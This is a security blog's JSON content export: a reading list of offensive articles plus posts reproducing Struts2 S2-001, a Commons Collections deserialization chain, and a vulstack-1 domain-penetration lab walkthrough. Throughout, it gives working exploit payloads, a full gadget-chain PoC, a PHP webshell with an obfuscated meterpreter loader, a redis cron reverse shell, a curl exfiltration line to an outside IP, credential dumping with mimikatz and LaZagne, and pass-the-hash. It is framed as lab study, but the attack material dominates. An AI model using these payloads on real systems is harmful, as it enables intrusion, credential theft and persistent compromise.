{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"https://glotozz.github.io","root":"/"},"pages":[{"title":"关于我","date":"2019-09-04T14:16:42.000Z","updated":"2020-03-18T11:55:12.901Z","comments":true,"path":"about/index.html","permalink":"https://glotozz.github.io/about/index.html","excerpt":"","text":""},{"title":"文章收集","date":"2019-09-04T14:16:42.000Z","updated":"2020-03-20T02:46:12.298Z","comments":true,"path":"read/index.html","permalink":"https://glotozz.github.io/read/index.html","excerpt":"","text":"3/20 GitHub 搜索骚技巧 如何定位域管理员 记一次Redis+Getshell经验分享 shodan自动化利用 3/19 用Powershell框架Empire进行内网域渗透(一) 3/18 30个有关Python的小技巧 metasploit续 内网渗透 3/17 Msfvenom学习总结 Payload实现分离免杀 3/16 requests.get()参数 Linux 反弹shell（二）反弹shell的本质 3/15 实战：爬取网易云音乐歌曲对应id并剔除无版权歌曲 3/14 [小密圈]经典写配置漏洞与几种变形学习 shellcode加载总结 后渗透之meterpreter使用攻略 3/13 Linux下的权限维持 3/12 特殊权限 SUID、SGID、Sticky 我所了解的渗透测试——Linux后门类型 3/11 Linux终极渗透测试命令总结（收藏备用） Linux下常见的权限维持方式 phpinfo中值得注意的信息 ssi注入漏洞 3/10 SSRF漏洞(原理&amp;绕过姿势) 一篇文章带你深入理解漏洞之 XXE 漏洞 OS注入指北 3/5 常见Web源码泄露总结 PHP的几种运行方式 Apache中.htaccess文件利用的总结与新思路拓展 3/4 HTML5新特性都有哪些 .htaccess详解及.htaccess参数说明 解析漏洞总结 浅析白盒审计中的字符编码及SQL注入 3/3 strtus2那些事 Struts2著名RCE漏洞引发的十年之思 Xss小游戏通关秘籍 3/2 深入了解序列化writeObject、readObject、readResolve 3/1 Fastjson反序列化漏洞利用分析 fastjson 远程反序列化poc的构造和分析 2/29 Java反序列化漏洞从入门到深入 Spring framework deserialization RCE漏洞分析以及利用 Jndi注入及Spring RCE漏洞分析 2/28 从零开始java代码审计系列(一) Java代码审计入门篇：WebGoat 8 2/27 SVG XSS的一个黑魔法 深入理解浏览器解析机制和XSS向量编码 CSP策略及绕过方法 2020年仍然有效的一些XSS Payload 2/26 LD_PRELOAD+putenv bypass 跨域方式及其产生的安全问题 Python3编码问题 CRLF注入漏洞"}],"posts":[{"title":"Java漏洞学习—S2-001","slug":"Java漏洞学习—S2-00","date":"2020-03-21T03:55:49.000Z","updated":"2020-03-21T08:36:11.309Z","comments":true,"path":"2020/03/21/Java漏洞学习—S2-00/","link":"","permalink":"https://glotozz.github.io/2020/03/21/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E2%80%94S2-00/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 预备知识 环境搭建 漏洞复现 原理分析 漏洞修复 总结 参考链接： 今天看下Struts2经典漏洞，掌握代码层面的原理。 预备知识干啥啥不行，盗图我最行 Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。 Struts Core(浅蓝色)：Struts2的核心部分。 Interceptors(浅绿色)：Struts2的拦截器。 User created(浅黄色)：需要开发人员创建的部分。 具体原理可以参考链接或者strtus官方文档 环境搭建影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8 maven搭建 123456789&lt;dependencies&gt; &lt;!-- struts2依赖包 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.0.8&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt; 注意maven/conf/settings.xml加个镜像 123456&lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;&#x2F;id&gt; &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&lt;&#x2F;url&gt; &lt;&#x2F;mirror&gt; 说出来你可能不信，我搭了半天。。 先创建一个Java项目 然后Add Framework Support 先导入maven下载struts 再次Add Framework Support，这时选中struts，jar包就是之前maven下好的包 添加Tomcat启动即可，如果出现报错，Project Settings-&gt;Artifacts再配置一下 成功启动 源码： https://github.com/vulhub/vulhub 漏洞复现获取tomcat路径 1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 命令执行 1%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 原理分析在LoginAction上打个断点 1invokeAction:404, DefaultActionInvocation (com.opensymphony.xwork2) 在DefaultActionInvocation类中反射调用了我们的类 漏洞是出现在Struts2重新渲染jsp时，对ognl表达式进行了递归解析，导致了恶意的表达式被执行。 主要是在xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/util/TextParseUtil.java 查到该方法的作用是将变量转换为对象 首先看到有个while(True)，之后就是先转化为%{xxx}的格式，利用ongl解析， 1Object o &#x3D; stack.findValue(var, asType); 比如%{username}解析为我们传入的值%{1+1}，而%{1+1}解析为2，2不满足规则， 跳出循环 漏洞修复在xwork2.0.4中， 添加了一个maxLoopCount属性，限制了递归解析的最大数目。 总结搭环境2h，调试10h，分析5min。。。 还没有对ongl的解析代码进行分析，有空再看 参考链接： https://mengsec.com/2019/10/29/Java-Web-S2-001/ https://struts.apache.org/core-developers/big-picture https://www.dazhuanlan.com/2020/01/19/5e23f4801e064/ https://struts.apache.org/maven/struts2-core/apidocs/index.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java反序列化漏洞-Apache Commons Collections","slug":"Java反序列化漏洞-Apache Commons Collections","date":"2020-03-20T03:00:55.000Z","updated":"2020-03-20T13:49:02.298Z","comments":true,"path":"2020/03/20/Java反序列化漏洞-Apache Commons Collections/","link":"","permalink":"https://glotozz.github.io/2020/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Apache%20Commons%20Collections/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 预备知识 环境搭建 漏洞分析 总结 参考链接： 预备知识Java中的反序列化readObject 原理不再赘述。 在重写readObject()方法时会写一些正常的操作，结合Java的反射机制便可以构造利用链。 Java的反射机制 下面摘自p牛的小密圈 反射是大多数语言里都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。 1234public void execute(String className, String methodName) throws Exception &#123; Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance());&#125; 获取类的方法： forName实例例化类对象的方法： newInstance获取函数的方法： getMethod执行函数的方法： invoke 上面的execute方法就可以执行classNmae类的methodName方法 环境搭建引入commons-collections maven搭建 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; 版本&lt;=3.2.1存在漏洞。 漏洞分析Apache Commons Collections中有一个特殊的接口，其中有一个实现该接口的类可以通过调用Java的反射机制来调用任意函数，叫做InvokerTransformer。 \\org\\apache\\commons\\collections\\functors\\InvokerTransformer.class 和我上面的例子很像，传入的参数是input是一个实例化对象，调用的方法iMethodName和参数iArgs都是InvokerTransformer实例化时设定的。所以利用这个方法便可以调用任意对象的任意方法。 想到常用的命令执行构造Runtime.getRuntime().exec(cmd) 123456Transformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;);invokerTransformer.transform(Runtime.getRuntime()); 成功执行 但是有时候我们需要递归调用对象也是支持的，commons-collections的ChainedTransformer类中封装好了了递归调用这个方法 测试代码 12345678Transformer[] transformers = new Transformer[] &#123; new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(Runtime.getRuntime()); new一个InvokerTransformer对象，传入要执行方法和参数，放入数组即可 接下来就是寻找反序列化的触发点。 这里首先用到了ConstantTransformer，内置的一个类，会将参数原样返回。 因此构造 12345678Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers); 但是序列化的时候报错Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime 因为Runtime实例化对象是不允许序列化的，所以不能直接传入实例化的对象，Runtime是利用getRuntime静态方法实例化的，所以就是获取到这个方法。 可以参考p牛之前解决Runtime不能newInstance()的代码，虽然当时解决的是Runtime类是单例模式这个特性 12345Class clazz = Class.forName(\"java.lang.Runtime\");Method getRuntimeMethod = clazz.getMethod(\"getRuntime\");Object runtime = getRuntimeMethod.invoke(clazz);Method execMethod = clazz.getMethod(\"exec\", String.class);execMethod.invoke(runtime, \"calc.exe\"); 第一次的object由我们传入，之后的调用形式为method.invoke(object,args) 那么首先传入一个Runtime.class，反射调用getRuntime，返回getRuntimeMethod， 反射调用invoke，返回Runtime实例对象，反射调用exec命令执行 参考链接代码 1234567891011121314151617Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers); 但是还是需要调用一下transform()方法才能触发 找到TiedMapEntry类的toString()方法，调用getValue()方法 Java中的toString方法是和PHP中的__toString魔术方法有相同的作用的，当将这个对象当做字符串处理的时候会自动调用这个方法。 getValue方法调用了map实例的get方法 那么就可以构造了 12345Transformer transformerChain = new ChainedTransformer(transformers);Map innerMap = new HashMap();Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); 这样反序列化entry对象后，还是需要System.out.println来触发toSring() 所以接下来我们找这样一个类：重写了readObject方法，并且对某个变量进行了字符串操作 看ysoserial的POC直接利用了BadAttributeValueExpException类，这个类直接就调用了toString方法。 可以根据依赖搜索相应的POC：@Dependencies({&quot;commons-collections:commons-collections:3.1&quot;}) BadAttributeValueExpException类 所以将BadAttributeValueExpException类实例化，val变量赋值为TiedMapEntry的实例化对象，反序列化的时候便会触发命令执行。 有一点就是val是私有属性，没有提供set()，需要使用反射来赋值 1234567891011121314151617package com.company;import java.lang.reflect.Field;public class Test &#123; private String readOnly; public String getReadOnly() &#123; return readOnly; &#125; public static void main(String[] args) throws SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException &#123; Test t = new Test(); Field f = t.getClass().getDeclaredField(\"readOnly\"); f.setAccessible(true); f.set(t, \"test\"); System.out.println(t.getReadOnly()); &#125;&#125; 最终POC 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); BadAttributeValueExpException poc = new BadAttributeValueExpException(null); // val是私有变量，所以利用下面方法进行赋值 Field valfield = poc.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 ois.readObject(); ois.close(); &#125;&#125; 通过传入字符串数组的方法带出更多数据，也可以反弹shell 1String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; 12345678910111213String[] execArgs = new String[] &#123; \"sh\", \"-c\", \"ifconfig &gt; /tmp/data &amp;&amp; curl localhost:7999/ -F 'file=@/tmp/data'\" &#125;;Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String[].class &#125;, new Object[] &#123; execArgs &#125;)&#125;; 总结整条链不长，分析下来还是挺有意思的，这个漏洞还有一些其他的利用方式，有空继续看。 自己对java的一些语言特性还是不够了解。 链接里的师傅写的很详细，膜 参考链接： https://p0sec.net/index.php/archives/121/ https://zsxq.tricking.io/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"二品vulstack-1","slug":"二品vulstack-1","date":"2020-03-18T10:25:46.000Z","updated":"2020-03-20T13:31:51.821Z","comments":true,"path":"2020/03/18/二品vulstack-1/","link":"","permalink":"https://glotozz.github.io/2020/03/18/%E4%BA%8C%E5%93%81vulstack-1/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、环境搭建 二、信息收集 三、getshell 四、域渗透 msf提权方法 开启远程桌面连接 cs与msf联动 获取密码或hash 信息收集 内网收集 内网攻击姿势-MS08-067 mimikatz插件 内网攻击姿势-SMB远程桌面口令猜测 内网攻击姿势-Oracle数据库 TNS服务漏洞 内网攻击姿势-RPC DCOM服务漏洞 内网攻击姿势- MS17-010 钓鱼攻击 内网其他主机端口-redis Getshell PTH 域渗透-横向移动[wmi利用] 内网其它主机端口-代理转发 Frp内网穿透 CS上线内网主机 SSH隧道 持久控制 HTTP Listener交互信息隐藏 SSP 金票利用 后门植入 痕迹清理 总结 参考链接： 昨天看到红日安全发了vulstack-1的wp，写的很详细，很多思路在我第一次做的时候都没有用到，于是打算跟着wp再学习一下。 一、环境搭建win7-仅主机+NAT win2003-仅主机 win2008-仅主机 网络拓扑图 边界机win7：192.168.52.143，169.254.129.186 域成员win2003：192.168.52.141 域控win2008：192.168.52.138 测试连通性 win7可以ping通另两台，但是另外两台ping不通win7， 可能由于Win7开启了防火墙且过滤了ICMP数据包，所以在后续信息收集阶段的活跃主机探测时不能使用-sP. 二、信息收集探测主机 1nmap -sn 192.168.56.0&#x2F;24 得到目标ip为192.168.56.129 端口扫描 1nmap -sS -sV -T5 -A -p- 192.168.1.129 目录扫描 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.129 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-large-directories.txt -x .php,.txt,.html 那个beifen.rar没扫出来，字典不够强大，略过 三、getshell存在phpmyadmin以及phpinfo.php root/root弱口令登录，phpinfo.php查看网站绝对路径C:/phpStudy/WWW 查看sql语句能否文件写入 1show variables like &#39;%secure%&#39; secure_file_priv=NULL 因此无法通过into outfile写入 这里可以通过mysql日志写入的方式getshell 12set global general_log &#x3D; &quot;ON&quot;SET global general_log_file&#x3D;&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;eval.php&quot; 插入一句话 1SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;; 蚁剑连接成功 四、域渗透1ipconfig &#x2F;all 发现在god.org域中 首先给msf弹个shell，因为存在web服务，我们用msfvenom生成一个shellcode，而不是pe文件 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;3333 -f raw &gt; test.php 这里显然没有杀软，如果有，之前的一句话木马应该是写不进去的 免杀payload 加密 123$code = file_get_contents('test.php');$encode = base64_encode(gzdeflate($code));echo $encode; 黑名单 123456789101112$l = 'baSe6';$o = '4_dE';$v = 'cO';$e = 'DE';$love = $l.$o.$v.$e;$c = \"love\";$a = $$c('cGhwaW5mbygpOwo=');eval($a);$a = strrev('EdOcEd_46eSaB');$b = $a('cGhwaW5mbygpOwo=');eval($b); 综合上面两个，最后的test1.php 123456&lt;?php$a = strrev('EdOcEd_46eSaB');$c = strrev('eTALfNizG');$b = $a('lVNtb9MwEP4rpopmRyoZHQiNlkmUaSBE2RDtt2myHOfSWs3sKHb3oir/nbPd9IUxDfIp9j33vFwu0DSm4Q3UpnFKz9mbdEQSVZMzQgcfTrLB+9NskA1OTileewwW3uIzIqokjCWlB1rXgLjl1sglOC4rBdrRlBwdEWW5FFUl8goQm6ZkTRKLLUnJek7Ww+PjNYq1w3Xgbnte3HL3WMOOF5XboPYKW5FzI1p6OVODflEJFfrR/H/Qd2EQ4uBFifEX/u3yYtYn06vz73w6+3Ux/uEPEz47/+lVG/DITx2r0RqkY4ntkwN30QeCPXmhgKXe3b7nQLDvOZQ6ONWGRAgpV1pamu4hn4Ji2d4rJxcYfMclhYXtgIYkqUCjeonHIph+h405npajDhr5ttBN0L81dH4QeJhSYN9K10IuWe8Sq71+YPPji6SJuKb4Rm/wJvfTwDncL1QFhKFVrLAkT8lH0lH/Q7CcZPu5fOfrHdfzKUPfnyGf7W59vK+Tq8/jyfSa3tq576Q3PpIdPa0Et5tyeI+LAQ8OtFVG88qIAgpG7WphrOr+AK34HNz2NoMHkCtnmqxQ1i8thztR0c3eRgzPH2th7Vlcc+53xqEAoxTT5OF3OQDGLwUVDmNNPB0LqHbzFX8D');$d = $c($b);eval($d); msf开启监听 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 3333exploit 进程迁移 注意：仅Windows本机meterpreter（windows / meterpreter / reverse_tcp）支持迁移。 from PHP meterpreter to native meterpreter with sessions -u 3 12psmigrate 2596 msf提权方法getsystem提权 12meterpreter &gt; getsystem[-] Unknown command: getsystem. exp提权 绕过UAC进行提权 123exploit&#x2F;windows&#x2F;local&#x2F;bypassuacexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbsexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection 提高程序运行级别 1exploit&#x2F;windows&#x2F;local&#x2F;ask windows提权漏洞 如ms13_053,ms14_058,ms16_016,ms16_032等 ================这里一开始出现了点问题 花了半天没搞好。。主要是网上基本没有相关的，还有个解答是msf的版本，但是我下了好几个版本+pro也不行。。。只有github上有个issue，只是提到了The target machine is Windows7 x64 不过最后还是解决啦 ===========================分割线 使用cobaltstrike teamserver启动服务，上线，Listener，generate生成可执行文件artifact.exe（因为当前环境没有杀软，故不考虑免杀），启动之后只要进程不被杀掉，随时可以上线。 开启远程桌面连接 通过cmd创建用户， 使用远程桌面连接执行文件 这里的cmd可以考虑蚁剑的虚拟终端,还有回显,meterpreter的shell没有回显 123net user gqy test@1233 &#x2F;add net localgroup administrators gqy &#x2F;addREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 若目标主机开启了防火墙限制了3389的远程连接，可反弹一个msf的shell回来，尝试关闭防火墙 1meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp 蚁剑cmd关闭防火墙 1netsh adcfirewall set allprofiles state off 远程桌面OWA\\gqy test@1233成功连上 注意这里有时候前面跟的是域 meterpreter上传并执行文件 12upload &#x2F;tmp&#x2F;artifact.exe C:&#x2F;Windowsexecute -f artifact.exe cs与msf联动先新建一个foreign Listener，然后把想派生的shell右键spawn选择新建的foreignlistener msf监听 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 1233exploit 因为是windows/meterpreter/reverse_tcp，这个shell是可以直接进程迁移的 获取密码或hashDump Hashes+Run Mimikatz 使用LaZagne抓取所有支持软件的密码 meterpreter或cs上传， cs执行 1bracon&gt;shell laZagne.exe all msf进入shell执行 1laZagne.exe all 信息收集cmd 1ipconfig &#x2F;all beacon 12shell net config Workstationnet view 得到192.168.52.138是域控 内网收集查看windwos漏打的补丁 https://github.com/AonCyberLabs/Windows-Exploit-Suggester 123456789run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息run post&#x2F;windows&#x2F;gather&#x2F;dumplinks #获取最近的文件操作run post&#x2F;windows&#x2F;gather&#x2F;enum_ie #获取IE缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome #获取Chrome缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_patches #补丁信息run post&#x2F;windows&#x2F;gather&#x2F;enum_domain #查找域控 查看路由信息 1run get_local_subnets 添加路由并扫描 12run autoroute -s 192.168.52.0&#x2F;24run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24 前面看到靶机存在nmap，使用nmap的端口扫描 12nmap --script&#x3D;vuln 192.168.52.141nmap --script&#x3D;vuln 192.168.52.138 192.168.52.141 192.168.52.138 内网攻击姿势-MS08-067 MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中存在的逻辑错误，造成栈缓冲区可被溢出，而获得远程代码执行（Remote Code Execution）。 打payload之前需要反向代理（autoroute只用于扫描），我用ew 上传到靶机 1ew_for_Win.exe -s rssocks -d 192.168.1.130 -e 8888 kali 1.&#x2F;ew_for_Linux32 -s rcsocks -l 1080 -e 8888 proxychains启动msfconsole 不设置 payload，攻陷后直接获得靶机1的cmd而不是meterpreter 注意下如果前面用了反向代理，这里payload需要用正向 12345search ms08-067use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapiset RHOSTS 192.168.52.141set payload windows&#x2F;meterpreter&#x2F;bind_tcprun 发现不太稳定，进程迁移也是一样 mimikatz插件通过mimikatz插件可以查看主机所在域，以及密码收集 12345load mimikatzmimikatz_command -f system::computermimikatz_command -f samdump::hashesmimikatz_command -f sekurlsa::searchPasswordswdigest 没有成功抓到 内网攻击姿势-SMB远程桌面口令猜测1search smb_login 123456use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_loginmsf exploit (smb_login)&gt;set rhosts 192.168.127.235msf exploit (smb_login)&gt;set user_file &#x2F;root&#x2F;Pentest&#x2F;user.txtmsf exploit (smb_login)&gt;set pass_file &#x2F;root&#x2F;Pentest&#x2F;pass.txtmsf exploit (smb_login)&gt;set stop_on_success truemsf exploit (smb_login)&gt;exploit 内网攻击姿势-Oracle数据库 TNS服务漏洞 oracle TNS Listener远程投毒（CVE-2012-1675） 1use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnspoison_checker TNS上的缓冲区漏洞（CVE-2009-1979） 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_auth_sesskey CVE-2002-0965MSF中漏洞利用模块 1exploit&#x2F;windows&#x2F;oracle&#x2F;tns_service_name 内网攻击姿势-RPC DCOM服务漏洞 微软修改dcerpc框架后形成自己的RPC框架来处理进程间的通信。微软的RPC框架在处理TCP/IP信息交换过程中存在的畸形消息时，未正确处理，导致缓冲区溢出漏洞；此漏洞影响使用RPC框架的DCOM接口，DCOM接口用来处理客户端机器发送给服务器的DCOM对象激活请求，如UNC路径。 1234search ms03_026use exploit&#x2F;windows&#x2F;dcerpc&#x2F;ms03_026_dcomset rhosts 192.168.52.141run 没成功 内网攻击姿势- MS17-0101234search ms17-010use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.52.141run 没成功，可能是由于前面打了一些别的payload 钓鱼攻击这个之前还真没搞过 快捷方式 钓鱼链接 但是下载完成之后还需要运行，因此需要一定的伪装技巧，比如Clone Site ok，上半部分至此就结束了 内网其他主机端口-redis Getshell1proxychains redis-cli -h 192.168.52.138 ①通过写SSH key的方式进行getshell 1234567891011生成密钥对ssh-keygen -t rsa将生成的公钥写入到文件中(echo -e &quot;\\n\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n\\n&quot;) &gt; pub.txt设置路径、文件、写入公钥 config set dir &#x2F;root&#x2F;.ssh&#x2F;config set dbfilename &quot;authorized_keys&quot;saveexit连接ssh -i id_rsa root@192.168.2.155 ②向Web目录中写webshell的方式进行getshell 123456flushdbconfig set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename &quot;gaia.php&quot;set gaia &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;saveexit ③redis写定时任务反弹shell 1234config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;config set dbfilename rootset x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.155&#x2F;2333 0&gt;&amp;1\\n&quot;save 内网其他主机端口-Mysql提权 1.UDF提权udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。2.MOF提权托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。MOF文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。 sqlmap一把梭 1sqlmap -d &quot;mysql:&#x2F;&#x2F;root:123456@node3.buuoj.cn:26002&#x2F;mysql&quot; --os-shell PTH pass-the-hash，在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)，分为LM hash和NT hash，如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。这类攻击适用于：域/工作组环境，可以获得hash，但是条件不允许对hash爆破，内网中存在和当前机器相同的密码，从windows到windows横向pth这一类攻击方法比较广泛 上传一个mimkatz 利用之前logonpasswords得到的hash 123mimikatzprivilege:debug sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:god.org &#x2F;ntlm:8601a88798be6a3948fce638a5790741 这时候就可以就ipc连接了 域渗透-横向移动[wmi利用] WMI是一个系统插件,用于在本地远程管理计算机的进程,服务,注册表等其它的一系列的特权操作 使用msf 1234567use exploit&#x2F;windows&#x2F;local&#x2F;wmiset SMBUser administratorset SMBPass vulstack@1set payload windows&#x2F;meterpreter&#x2F;bind_tcpset SMBDomain god.orgset session 3run 失败了，或者使用wmiexec 1234567git clone https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;impacket_static_binariespython setup.py installcd 